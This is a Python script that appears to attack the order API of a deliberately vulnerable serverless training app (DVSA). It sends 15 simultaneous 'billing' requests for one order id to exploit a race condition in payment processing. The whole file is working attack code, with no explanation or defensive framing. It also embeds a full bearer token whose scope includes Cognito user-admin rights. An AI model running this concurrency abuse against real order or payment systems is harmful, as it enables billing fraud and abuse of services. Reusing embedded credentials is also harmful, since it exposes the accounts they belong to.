import threading
import requests

url = "https://gfxvwxy0n4.execute-api.eu-north-1.amazonaws.com/dvsa/order"
token = "eyJraWQiOiI1bk5mTE5tUXlPNmhWaStGbHBheEkyb09ldUxZMmR2c3h0cDR0OXo1MDFBPSIsImFsZyI6IlJTMjU2In0.eyJzdWIiOiI5MDJjMzk1Yy1lMGUxLTcwOTQtNGIwNi0zZDkyYjNkNzkwMGIiLCJpc3MiOiJodHRwczpcL1wvY29nbml0by1pZHAuZXUtbm9ydGgtMS5hbWF6b25hd3MuY29tXC9ldS1ub3J0aC0xX0RmMW1HczdOSyIsImNsaWVudF9pZCI6IjcyOG1iZ2RzbmxjZ2tlYXFrMTE4am1obGQ3Iiwib3JpZ2luX2p0aSI6IjU5N2RjOWJiLWUyYWMtNDI4OC04NWIyLTVmOTEzZTU3ZDhiNyIsImV2ZW50X2lkIjoiMGYwNzM4ZjAtYWEyMC00YmJjLWE3YTEtYWE5ZjAzZWRiMGY0IiwidG9rZW5fdXNlIjoiYWNjZXNzIiwic2NvcGUiOiJhd3MuY29nbml0by5zaWduaW4udXNlci5hZG1pbiIsImF1dGhfdGltZSI6MTc3NzA1NDcyOCwiZXhwIjoxNzc3MDU4MzI4LCJpYXQiOjE3NzcwNTQ3MjgsImp0aSI6IjFlYTFiMDBkLTMzNjMtNDEwNy05NDRlLTgxYTdhMmUxNWQ3ZCIsInVzZXJuYW1lIjoiOTAyYzM5NWMtZTBlMS03MDk0LTRiMDYtM2Q5MmIzZDc5MDBiIn0.SiBybLgyfxZ3m-OoAWWf4P1b5vbPlQJ_84HkDzsIhA22zAgfDfkyaar3uBe4-KzMHocq3sLaO9LJJGm2ZRzEWdLsF3g3oqgyzEmMDHh2QX2wg9qIcSqHBmYL7ysbKjuFcxMEYE8JRUXK_qsTkhFWszkrGkjR4-ojUEOhrz-GtmEeqkBi_1QYxfqNDMLPoK2UvyKvSMsTZhLMonM4ggTE3zPU2QE8D3crK-oNxWZ8Hs6_Lg04oX0EQtJyKWiNFs3vLHliWrgTQv35mpr-LXho4zflJemJdkxHeSJemMq2N6XcxROoL6oCNuZB6a0Zi5prihNPWWtFEGoZk5y-RwSMNA"
headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
payload = '{"action":"billing","order-id":"9d4f152d-4381-4dea-91f1-bcf611f0c77a","data":{"ccn":"4242","exp":"12/25","cvv":"123"}}'

def call():
    try:
        r = requests.post(url, data=payload, headers=headers)
        print(f"Status: {r.status_code} – {r.text[:80]}")
    except Exception as e:
        print(f"Error: {e}")

print("Sending 15 concurrent billing requests...")
threads = []
for _ in range(15):
    t = threading.Thread(target=call)
    t.start()
    threads.append(t)
for t in threads:
    t.join()